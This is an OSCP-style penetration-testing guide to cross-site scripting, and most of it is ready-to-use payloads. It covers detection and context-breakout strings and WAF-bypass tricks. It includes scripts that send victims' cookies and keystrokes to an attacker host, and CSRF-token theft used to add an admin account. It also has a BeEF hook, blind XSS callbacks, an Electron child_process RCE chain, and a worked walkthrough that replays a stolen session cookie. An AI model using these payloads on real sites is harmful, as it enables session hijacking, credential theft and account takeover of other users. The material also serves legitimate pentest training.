# XSS (Cross-Site Scripting) — Complete OSCP Guide

> **Scope:** Every XSS type, detection method, payload category, filter bypass, and exploitation technique — from finding the injection point to session hijacking, keylogging, and pivoting to further attacks. `<ATTACKER_IP>` = your machine, `<TARGET_IP>` = target.

---

## Table of Contents

1. [What is XSS — The Concept](#1-what-is-xss--the-concept)
2. [The Three Types of XSS](#2-the-three-types-of-xss)
3. [Step 1 — Finding Injection Points](#3-step-1--finding-injection-points)
4. [Step 2 — Detection Payloads](#4-step-2--detection-payloads)
5. [Step 3 — Context Matters (Where Your Input Lands)](#5-step-3--context-matters-where-your-input-lands)
6. [Step 4 — Reflected XSS Payloads](#6-step-4--reflected-xss-payloads)
7. [Step 5 — Stored XSS Payloads](#7-step-5--stored-xss-payloads)
8. [Step 6 — DOM-Based XSS](#8-step-6--dom-based-xss)
9. [Step 7 — Filter & WAF Bypass Payloads](#9-step-7--filter--waf-bypass-payloads)
10. [Step 8 — Cookie Theft / Session Hijacking](#10-step-8--cookie-theft--session-hijacking)
11. [Step 9 — Keylogging](#11-step-9--keylogging)
12. [Step 10 — CSRF Token Theft & Action Execution](#12-step-10--csrf-token-theft--action-execution)
13. [Step 11 — BeEF Framework](#13-step-11--beef-framework)
14. [Step 12 — XSS to RCE Chains](#14-step-12--xss-to-rce-chains)
15. [Step 13 — Blind XSS](#15-step-13--blind-xss)
16. [Full Walkthrough](#16-full-walkthrough)
17. [Quick Reference Card](#17-quick-reference-card)

---

## 1. What is XSS — The Concept

**XSS (Cross-Site Scripting)** happens when an application takes user input and renders it back into a page **as HTML/JavaScript** instead of as plain text — letting an attacker inject a script that runs in the **victim's browser**, in the context of the vulnerable site.

```html
<!-- Vulnerable code pattern -->
<p>Welcome, <?php echo $_GET['name']; ?></p>

<!-- Normal use: ?name=John -> <p>Welcome, John</p> -->
<!-- Attacker:    ?name=<script>alert(1)</script>
     -> <p>Welcome, <script>alert(1)</script></p>
     The browser parses this as a real <script> tag and EXECUTES it. -->
```

**Why it matters:** unlike SQLi/command injection (which attack the server), XSS attacks **other users** of the application — through their browser, using their session, their cookies, their logged-in privileges.

---

## 2. The Three Types of XSS

```
REFLECTED   -> payload in the REQUEST (URL param, form field) is immediately
               echoed back in the RESPONSE, not stored. Needs the victim to
               click a crafted link.

STORED      -> payload is SAVED on the server (comment, profile field,
               review) and served to EVERY user who later views that page.
               No victim interaction needed beyond just viewing the page.

DOM-BASED   -> payload never even touches the server — pure client-side
               JavaScript reads attacker-controlled data (URL fragment,
               location.hash) and writes it unsafely into the page.
```

---

## 3. Step 1 — Finding Injection Points

```
- Search boxes / search results pages ("You searched for: ...")
- Comment sections, reviews, forum posts
- Profile fields (name, bio, "display name")
- URL parameters reflected anywhere in the page
- Error messages that echo back user input
- File upload filenames displayed later
- HTTP headers reflected (User-Agent, Referer, X-Forwarded-For shown in admin logs/panels)
- "Welcome back, <username>" style greetings
```

---

## 4. Step 2 — Detection Payloads

```html
<!-- Basic alert -- the universal "is this vulnerable at all" test -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- If <script> tags get filtered/stripped, try these alternate triggers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>

<!-- Polyglot -- works across MANY different injection contexts at once,
     useful as a single payload to throw at every field during recon -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

<!-- Confirm via curl -- check if the payload comes back UNESCAPED in the response -->
curl -s "http://<TARGET_IP>/search?q=<script>alert(1)</script>" | grep -i "<script>alert(1)</script>"
```

---

## 5. Step 3 — Context Matters (Where Your Input Lands)

**Why this section matters:** the right payload depends entirely on WHERE your input is reflected. Always view source/inspect element first to see the exact surrounding HTML.

```html
<!-- Context 1: directly inside HTML body -->
<p>USER_INPUT_HERE</p>
<!-- Payload: <script>alert(1)</script>  -->

<!-- Context 2: inside an HTML attribute value -->
<input value="USER_INPUT_HERE">
<!-- Need to BREAK OUT of the attribute first: -->
"><script>alert(1)</script>
" autofocus onfocus=alert(1) x="

<!-- Context 3: inside a JavaScript string (e.g. inside a <script> block) -->
<script>var name = "USER_INPUT_HERE";</script>
<!-- Need to break out of the JS string AND close/reopen the script logically: -->
";alert(1);//
</script><script>alert(1)</script>

<!-- Context 4: inside an HTML comment -->
<!-- USER_INPUT_HERE -->
<!-- Need to close the comment first: -->
--><script>alert(1)</script>

<!-- Context 5: inside a CSS context (style attribute/block) -->
<style>USER_INPUT_HERE</style>
</style><script>alert(1)</script>

<!-- Context 6: inside a URL attribute (href, src) -->
<a href="USER_INPUT_HERE">click</a>
javascript:alert(1)
```

---

## 6. Step 4 — Reflected XSS Payloads

```html
<!-- Basic GET parameter reflection -->
http://<TARGET_IP>/search?q=<script>alert(1)</script>
http://<TARGET_IP>/page?name=<img src=x onerror=alert(document.cookie)>

<!-- POST-based reflected XSS test -->
curl -X POST http://<TARGET_IP>/contact -d "message=<script>alert(1)</script>"

<!-- Crafted link to send to a victim (this is what makes it "reflected" --
     requires the victim to actually click/load this specific URL) -->
http://<TARGET_IP>/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E

<!-- Auto-submitting form (useful when the vulnerable param only accepts POST,
     so a simple link won't trigger it -- host this HTML somewhere and send
     the victim THIS page instead) -->
<html>
<body onload="document.forms[0].submit()">
<form action="http://<TARGET_IP>/contact" method="POST">
<input type="hidden" name="message" value="&lt;script&gt;alert(1)&lt;/script&gt;">
</form>
</body>
</html>
```

---

## 7. Step 5 — Stored XSS Payloads

```html
<!-- Submit this into ANY persisted field -- comment, profile bio, review,
     support ticket subject, etc. -- then it fires for every subsequent
     viewer of that page, including admins reviewing the content -->
<script>alert(document.domain)</script>

<!-- Profile "display name" field -- fires whenever ANYONE views your profile
     or whenever your name appears in a list/leaderboard/admin user table -->
<script>fetch('http://<ATTACKER_IP>/c?cookie='+document.cookie)</script>

<!-- Comment/review field test -->
curl -X POST http://<TARGET_IP>/post-comment -d "comment=<script>alert(1)</script>&post_id=1"

<!-- Filename-based stored XSS -- some apps display the uploaded filename
     unsanitized in a file listing page -->
mv payload.jpg '<script>alert(1)</script>.jpg'
curl -F "file=@</script>alert(1)<script>.jpg" http://<TARGET_IP>/upload
```

---

## 8. Step 6 — DOM-Based XSS

```html
<!-- Vulnerable JS pattern to look for in page source/JS files: -->
<script>
document.write(location.hash.substring(1));
// or
document.getElementById('output').innerHTML = location.search;
// or
eval(decodeURIComponent(location.hash.substring(1)));
</script>

<!-- These all read attacker-controlled URL parts DIRECTLY and write them
     unsafely into the page -- the payload never even reaches the server -->

http://<TARGET_IP>/page#<script>alert(1)</script>
http://<TARGET_IP>/page?input=<img src=x onerror=alert(1)>

<!-- If document.write or innerHTML is used with location.hash specifically -->
http://<TARGET_IP>/page.html#<img src=x onerror=alert(document.domain)>

<!-- If eval() is used on the hash -->
http://<TARGET_IP>/page.html#alert(1)
http://<TARGET_IP>/page.html#'-alert(1)-'
```

```bash
# Finding DOM XSS sinks across JS files -- grep for dangerous sink functions
# in any downloaded/crawled JS
grep -n "document.write\|innerHTML\|eval(\|location.hash\|location.search" app.js
```

---

## 9. Step 7 — Filter & WAF Bypass Payloads

```html
<!-- <script> tag blocked -- use alternate event-handler-based triggers -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe src=javascript:alert(1)>
<object data=javascript:alert(1)>

<!-- Case variation (case-insensitive filters often miss mixed case) -->
<ScRiPt>alert(1)</sCriPt>
<IMG SRC=x ONERROR=alert(1)>

<!-- "script" keyword filtered but case allowed through -- nested tag trick
     (filter removes the inner "script" substring, leaving a valid tag) -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Encoding-based bypass -- HTML entity encoding of characters -->
&lt;script&gt;alert(1)&lt;/script&gt;
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- No spaces allowed -- use / or newline instead of space inside a tag -->
<img/src=x/onerror=alert(1)>
<svg%0Aonload=alert(1)>

<!-- No parentheses allowed -- use alternate call syntax via backticks (template literal tag) -->
<script>alert`1`</script>

<!-- Quotes filtered -- avoid quotes entirely using template literals -->
<script>alert(/XSS/)</script>

<!-- "alert" specifically blocked as a keyword -- use other equally useful functions -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>print()</script>

<!-- Length-limited input field -- shorten via JS shorthand -->
<svg onload=alert(1)>             <!-- already quite short -->
<script src=//<ATTACKER_IP>/x.js></script>     <!-- load a longer payload externally -->
```

---

## 10. Step 8 — Cookie Theft / Session Hijacking

```html
<!-- Send the victim's cookie to a listener you control -->
<script>fetch('http://<ATTACKER_IP>/steal?c='+document.cookie)</script>

<!-- Image-based exfil (works even when fetch/XHR is blocked by CSP, since
     <img> requests aren't subject to the same restrictions in older setups) -->
<script>new Image().src='http://<ATTACKER_IP>/steal?c='+document.cookie;</script>

<!-- If HttpOnly flag is set on the cookie (document.cookie won't show it),
     this technique WON'T work -- you'd need a different vector (e.g. session
     riding via authenticated actions instead of direct cookie theft) -->
```

```bash
# Catch the stolen cookie -- simple Python listener
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print('Captured:', self.path)
        self.send_response(200); self.end_headers()
HTTPServer(('0.0.0.0', 80), H).serve_forever()
"

# Or just use a netcat listener and watch raw HTTP requests come in
nc -lvnp 80
```

```bash
# Once you have the stolen session cookie, use it directly in your browser
# or via curl to impersonate the victim
curl http://<TARGET_IP>/dashboard -H "Cookie: session=STOLEN_VALUE_HERE"
```

---

## 11. Step 9 — Keylogging

```html
<!-- Logs every keypress on the page and exfiltrates it to your listener -->
<script>
document.onkeypress = function(e) {
    fetch('http://<ATTACKER_IP>/log?key=' + e.key);
}
</script>

<!-- Slightly stealthier -- batches keys and sends periodically instead of
     one request per keystroke (less noisy/obvious in network logs) -->
<script>
var keys = '';
document.onkeypress = function(e) { keys += e.key; };
setInterval(function() {
    if (keys.length > 0) {
        fetch('http://<ATTACKER_IP>/log?keys=' + encodeURIComponent(keys));
        keys = '';
    }
}, 5000);
</script>
```

---

## 12. Step 10 — CSRF Token Theft & Action Execution

```html
<!-- If XSS exists on a page that ALSO has access to a CSRF token (e.g. in
     a hidden form field or meta tag), you can read that token via JS and
     use it to perform actions AS the victim, bypassing the CSRF protection
     entirely since you're running inside their authenticated session -->

<script>
fetch('/account/change-email', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'email=attacker@evil.com&csrf_token=' + document.querySelector('input[name=csrf_token]').value
});
</script>

<!-- Add yourself as an admin (example -- if such an endpoint exists and the
     victim browsing the page happens to BE an admin) -->
<script>
fetch('/admin/add-user', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'username=hacker&role=admin&csrf_token=' + document.querySelector('meta[name=csrf-token]').content
});
</script>
```

---

## 13. Step 11 — BeEF Framework

For full browser exploitation beyond a single payload — BeEF "hooks" the victim's browser and gives you an ongoing command/control style interface.

```bash
# Install/start (Kali — often pre-installed)
sudo apt install beef-xss
sudo beef-xss

# Default web UI: http://127.0.0.1:3000/ui/panel
# Default creds shown on first launch in config.yaml

# The "hook" script to inject via your XSS payload
<script src="http://<ATTACKER_IP>:3000/hook.js"></script>

# Once a victim loads a page containing this, their browser appears in the
# BeEF panel as a "hooked" target -- from there you can run modules:
# - get browser/OS/plugin info
# - social engineering (fake update prompts)
# - port scanning the victim's INTERNAL network from their browser
# - persistent XSS module re-injection
# - webcam/clipboard access attempts (browser/permission dependent)
```

---

## 14. Step 12 — XSS to RCE Chains

XSS itself runs in a browser, not on the server — but it can be the FIRST step in a longer chain toward server-side compromise.

```html
<!-- If the application has an admin panel with a feature like "export to
     PDF" or "preview as admin" that processes attacker-supplied HTML/JS,
     a stored XSS payload that fires when an ADMIN views it can be chained
     into further actions an admin can perform but you can't directly -->

<script>
// Example: if an admin panel lets admins run arbitrary "test" code/templates
// server-side via an AJAX endpoint, and XSS fires in the admin's session:
fetch('/admin/run-template', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({template: '{{7*7}}'})  // SSTI test payload riding on the admin's session
});
</script>

<!-- Electron/desktop apps using embedded Chromium (common in some internal
     tools) can sometimes have XSS escalate to actual code execution on the
     HOST machine if nodeIntegration is enabled -- check for this specifically
     if the target application is an Electron-based desktop tool, not a
     normal browser-rendered website -->
<script>
require('child_process').exec('id', (err, stdout) => {
    fetch('http://<ATTACKER_IP>/rce?out='+encodeURIComponent(stdout));
});
</script>
```

---

## 15. Step 13 — Blind XSS

**The concept:** you inject a payload into a field you can't directly see the output of (a support ticket, a contact form, an admin-only log viewer) — you won't see it fire yourself, but it may execute later when an admin/internal employee views that data in their own dashboard.

```html
<!-- Always use an OUT-OF-BAND callback payload for blind XSS, since you have
     no visual confirmation otherwise -->
<script src="http://<ATTACKER_IP>/blind.js"></script>

<!-- Where blind.js (hosted on your machine) contains: -->
fetch('http://<ATTACKER_IP>/hit?url='+encodeURIComponent(document.location)+'&cookie='+encodeURIComponent(document.cookie));

<!-- Submit this into EVERY input field across the app you can find --
     contact forms, support tickets, "report a bug" fields, user-agent
     strings if logged, profile fields -- then just wait and watch your
     listener for callbacks over the following hours/days -->
```

```bash
# Listener to catch blind XSS callbacks
python3 -m http.server 80
# Or use a dedicated service like XSSHunter / Burp Collaborator for this
```

---

## 16. Full Walkthrough

**Scenario:** A comment field on a blog app appears to render input unsanitized.

**Step 1 — Test the field:**
```bash
curl -X POST http://<TARGET_IP>/comment -d "post_id=1&comment=<script>alert(1)</script>"
```

**Step 2 — View the post page, confirm the payload fires (or check response source):**
```bash
curl -s http://<TARGET_IP>/post/1 | grep -i "<script>alert(1)</script>"
# Found unescaped -> confirmed STORED XSS
```

**Step 3 — Replace test payload with a cookie-stealing payload:**
```bash
curl -X POST http://<TARGET_IP>/comment \
  -d "post_id=1&comment=<script>fetch('http://<ATTACKER_IP>/c?x='+document.cookie)</script>"
```

**Step 4 — Start a listener:**
```bash
nc -lvnp 80
```

**Step 5 — Wait for an admin/another user to view the post — capture their cookie:**
```
GET /c?x=session=abc123xyz HTTP/1.1
```

**Step 6 — Use the stolen session:**
```bash
curl http://<TARGET_IP>/admin -H "Cookie: session=abc123xyz"
```

---

## 17. Quick Reference Card

```
====================================================================
 XSS — OSCP PAYLOAD QUICK REFERENCE
====================================================================
 <ATTACKER_IP> = your machine     <TARGET_IP> = target
====================================================================

[DETECTION]
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>

[TYPES]
  Reflected -> in URL/param, echoed immediately, needs victim click
  Stored    -> saved on server, fires for every later viewer
  DOM       -> pure client-side, never touches server (location.hash, innerHTML)

[CONTEXT-SPECIFIC BREAKOUTS]
  HTML body:        <script>alert(1)</script>
  Attribute value:  "><script>alert(1)</script>   or   " onfocus=alert(1) autofocus x="
  JS string:        ";alert(1);//
  HTML comment:     --><script>alert(1)</script>

[FILTER BYPASS]
  Tag filtered:      <svg onload=alert(1)>   <img src=x onerror=alert(1)>
  Case filter:        <ScRiPt>alert(1)</sCriPt>
  Word "script" gone: <scr<script>ipt>alert(1)</scr</script>ipt>
  No spaces:           <svg/onload=alert(1)>
  No parens:            <script>alert`1`</script>

[COOKIE THEFT]
  <script>fetch('http://<ATTACKER_IP>/c?x='+document.cookie)</script>
  nc -lvnp 80                                              [listener]

[KEYLOGGER]
  <script>document.onkeypress=function(e){fetch('http://<ATTACKER_IP>/log?k='+e.key)}</script>

[CSRF TOKEN STEAL + ACTION]
  fetch('/admin/add-user',{method:'POST',body:'role=admin&csrf='+
    document.querySelector('meta[name=csrf-token]').content})

[BEEF HOOK]
  <script src="http://<ATTACKER_IP>:3000/hook.js"></script>
  Panel: http://127.0.0.1:3000/ui/panel

[BLIND XSS]
  <script src="http://<ATTACKER_IP>/blind.js"></script>
  -> submit into EVERY form field site-wide, wait for admin to view it

[KEY TAKEAWAY]
  Always check the EXACT HTML context your input lands in before
  picking a payload -- a body-context payload won't fire inside an
  attribute, and vice versa. View source / inspect element FIRST.
====================================================================
```

---

*This document is for authorized penetration testing, OSCP exam preparation, and CTF/lab competitions only. Always obtain written permission before testing systems you do not own.*
